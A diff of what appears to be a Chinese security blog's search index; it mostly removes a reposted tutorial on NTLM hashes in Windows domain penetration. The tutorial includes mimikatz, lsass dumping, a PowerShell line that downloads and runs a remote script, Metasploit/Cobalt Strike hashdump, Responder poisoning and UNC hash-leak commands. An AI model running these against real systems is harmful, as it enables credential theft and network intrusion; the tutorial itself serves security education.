5b0176181609a122738f60d1af2ee6327b25920a419ddbce2d2226ffcf0ff56f57fd0c73a72c9cc41b7511ac71b5a559818570f0751319bc2c13ac8ac6de88e11054820083316b9918a0ae1dbfdbea453999136a05b84738f0c58923da04970287ba64a6c0657a2e00be1c6726dee730909cea55e3619de7f68e9da69fd6046aa73beaf78dffd8fc8ec51988ef191ee5be33002b94d7d08fa4d8fdcd104b104e48b4280e3cdd168eb22ea068587441857fd29c830918e03ff8f8496aeb3cbb7327fb51fcd9e81848ff35759af6d819b54e922e5f959c7f14cf7b8dd9c0dfacba272b33f53f60623a1974cac44cdaff820cf4f57be967d6c5f975d1c456d86f1eca3a1525984b7d16419950c19ebd9ceadd71a36b68512f8c62036331c3929ddc1ad1d3b4b5cf2d2406da232e1b555fca2887c0059d5aa3bfb67e0cd061ed01ce71e4a2835292b39a17f0caa832f73d33ecbdc61ea09636f9e75a72d8ccb22c2b2f512968c1d6d56ffa588fad36cc257c16144f80503e3823a93099f</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
@@ -5295,7 +5293,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>其他中间件漏洞</title>
     <url>/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/</url>
-    <content><![CDATA[<h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
+    <content><![CDATA[<h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
 <p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p>
 <p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
 <p><strong>2、 漏洞复现</strong></p>
@@ -5354,353 +5352,9 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
       </tags>
   </entry>
   <entry>
-    <title>域渗透之NTML hash</title>
-    <url>/2020/06/05/yu-shen-tou-zhi-ntml-hash/</url>
-    <content><![CDATA[<p><strong>转载自:</strong><a href="https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/" target="_blank" rel="noopener">https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/</a></p>
-<h2 id="域渗透之NTML-Hash"><a href="#域渗透之NTML-Hash" class="headerlink" title="域渗透之NTML-Hash"></a>域渗透之NTML-Hash</h2><h3 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h3><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了<strong>WindowsNT挑战/响应验证机制</strong>，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。</p>
-<p>​     NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串<code>KGS!@#$%</code>。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本</p>
-<h4 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h4><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p>
-<p><strong>补充：</strong></p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Windows Vista`和`Windows<span class="built_in"> Server </span>2008`以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式`LM hash:NT hash`，可以将LM Hash填0(LM hash可以为任意值)，即`00000000000000000000000000000000:NT hash</span><br></pre></td></tr></table></figure>
-
-<h4 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h4><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p>
-<p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p>
-<blockquote>
-<p>Note：类似的，在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件</p>
-</blockquote>
-<p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p>
-<p>通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p>
-<p>本地认证流程</p>
-<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">winlogon</span>.exe -&gt;</span> 接收用户输入 -&gt; <span class="function"><span class="title">lsass</span>.exe -&gt;</span> (认证)</span><br></pre></td></tr></table></figure>
-
-<p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p>
-<ul>
-<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>
-<li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li>
-</ul>
-<p>在系统中，hash格式是类似这样的：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::</span><br></pre></td></tr></table></figure>
-
-<h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h4><p>用户密码为<code>test123</code></p>
-<p>转换成十六进制的格式为<code>74657374313233</code></p>
-<p>转换成Unicode格式为<code>7400650073007400310032003300</code></p>
-<p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p>
-<p><strong>注：</strong></p>
-<p>MD4加密可使用工具HashCalc，如下图</p>
-<p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p>
-<p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p>
-<blockquote>
-<p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p>
-</blockquote>
-<p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p>
-<p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p>
-<p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p>
-<p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p>
-<blockquote>
-<p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p>
-</blockquote>
-<p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br></pre></td></tr></table></figure>
-
-<h3 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h3><h5 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h5><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询/应答 (Challenge/Response)消息交换模式的认证机制， 常用于工作组和域环境下<code>登录场景的身份认证</code>。</p>
-<h4 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h4><p>​    NTML网络认证采用质询/应答 (Challenge/Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p>
-<p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p>
-<blockquote>
-<p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p>
-</blockquote>
-<p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p>
-<ul>
-<li><strong>协商</strong>：主要用于确认双方协议版本</li>
-<li><strong>质询</strong>：质询/应答 (Challenge/Response) 模式，用于消息交换</li>
-<li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li>
-</ul>
-<p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p>
-<p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p>
-<p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<strong>已登录某客户端的用户去请求另一台服务器的资源</strong> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">net use x: \\<span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>\$share /u:administrator password</span><br></pre></td></tr></table></figure>
-
-<p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p>
-<p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p>
-<p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p>
-<blockquote>
-<p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，NTML认证机制参与认证过程。此部分详细内容请参考<a href>域渗透之Kerberos</a> 。</p>
-</blockquote>
-<p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p>
-<h4 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h4><p>工作组中，涉及Clinet、Server，流程如下：</p>
-<ul>
-<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
-<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
-<li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li>
-<li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li>
-<li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
-</ul>
-<h4 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h4><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p>
-<blockquote>
-<ol>
-<li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85).aspx" target="_blank" rel="noopener"><em>hash</em></a> of the password and discards the actual password.</li>
-<li>The client sends the user name to the server (in <a href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85).aspx" target="_blank" rel="noopener"><em>plaintext</em></a>).</li>
-<li>The server generates a 16-byte random number, called a <em>challenge</em> or <a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>nonce</em></a>, and sends it to the client.</li>
-<li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li>
-<li>The server sends the following three items to the domain controller:<ul>
-<li>User name</li>
-<li>Challenge sent to the client</li>
-<li>Response received from the client</li>
-</ul>
-</li>
-<li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li>
-<li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.</li>
-</ol>
-</blockquote>
-<p>翻译过来流程大致如下：</p>
-<ol>
-<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
-<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
-<li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li>
-<li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li>
-<li>服务器将<strong><em>Username、Challenge、Response\</em></strong><code>（Net-NTML hash）</code>发送给<strong><em>DC (Domain Controller，域控制器)\</em></strong></li>
-<li>DC域控制器从<strong><em>AD (Account Database，帐户数据库)\</em></strong> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
-</ol>
-<h3 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h3><h5 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h5><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是：</p>
-<blockquote>
-<p>大部分这种本地抓取hash的工具都需要管理员权限</p>
-</blockquote>
-<p>常用工具：</p>
-<ul>
-<li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p>
-</li>
-<li><p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></p>
-</li>
-<li><p><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></p>
-</li>
-<li><p><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></p>
-</li>
-<li><p>Cobaltstrike</p>
-</li>
-<li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">quarkspwdump.exe -dhl</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p>更方便的mimikatz命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords full"</span></span><br></pre></td></tr></table></figure>
-
-<p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span><span class="built_in">log</span> sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></li>
-</ul>
-<p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
-
-<p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'</span>); <span class="string">"Get-Process lsass | Out-Minidump"</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></li>
-</ul>
-<p>首先需要获取<code>SYSTEM</code>权限</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
-
-<p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>
-
-<p><code>metasploit</code>提供的抓取hash的一些模块：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
-
-<p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p>
-<p>顺便介绍一些能够直接获取明文密码的模块命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest （kerberos）</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords </span><br><span class="line"></span><br><span class="line">meterpreter&gt;load kiwi</span><br><span class="line">meterpreter&gt; creds_wdigest</span><br></pre></td></tr></table></figure>
-
-<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">beacon&gt; </span>getuid</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell-<span class="meta">import</span> /root/powershell/<span class="meta">Get</span>-PassHashes.ps1</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell <span class="meta">Get</span>-PassHashes</span><br></pre></td></tr></table></figure>
-
-<p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; wdigest //读取信息</span><br><span class="line">beacon&gt; hashdump</span><br></pre></td></tr></table></figure>
-
-<p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p>右击受害者主机–access-hashdump</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; powershell-import /root/powershell/Inveigh/Inveigh.ps1</span><br><span class="line">beacon&gt; powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h4><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p>
-<p>常用工具：</p>
-<ul>
-<li>Responder</li>
-<li>Metasploit</li>
-</ul>
-<h5 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h5><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
-
-<p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; Servers to start</span><br><span class="line">SQL = Off</span><br><span class="line">SMB = On</span><br><span class="line">Kerberos = On</span><br><span class="line">FTP = Off</span><br><span class="line">POP = Off</span><br><span class="line">SMTP = Off</span><br><span class="line">IMAP = Off</span><br><span class="line">HTTP = On</span><br><span class="line">HTTPS = On</span><br><span class="line">DNS = On</span><br><span class="line">LDAP = On</span><br></pre></td></tr></table></figure>
-
-<p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">Challenge</span> = <span class="number">1122334455667788</span></span><br></pre></td></tr></table></figure>
-
-<p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p>
-<p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p>
-<p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p>
-<ul>
-<li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li>
-<li>钓鱼文档：doc、docx、pdf</li>
-<li>后门设置：</li>
-</ul>
-<p>例：</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">regsvr32 /s /u /i:<span class="comment">//17.10.0.1/@abc hello.dll</span></span><br><span class="line"></span><br><span class="line">powershell -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">powershell -nop -exec bypass -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">Invoke-Item \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Get-Content \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Start-Process \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br></pre></td></tr></table></figure>
-
-<h5 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h5><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p>
-<p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">dumping-domain-password-hashes</a></p>
-<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">Places of Interest in Stealing NetNTLM Hashes</a> 及译文 <a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">花式窃取NetNTLM哈希的方法</a></p>
-<h3 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h3><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p>
-<h4 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h4><h5 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h5><p>下面是一些提供在线解密的站点：</p>
-<ul>
-<li><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></li>
-<li><a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></li>
-<li><a href="http://hashcrack.com/index.php" target="_blank" rel="noopener">http://hashcrack.com/index.php</a></li>
-<li><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></li>
-<li><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a></li>
-</ul>
-<h5 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h5><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p>
-<h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john HTTP-NTLMv2-17.10.0.10.txt</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p>
-<p><code>-m</code>  hash类型</p>
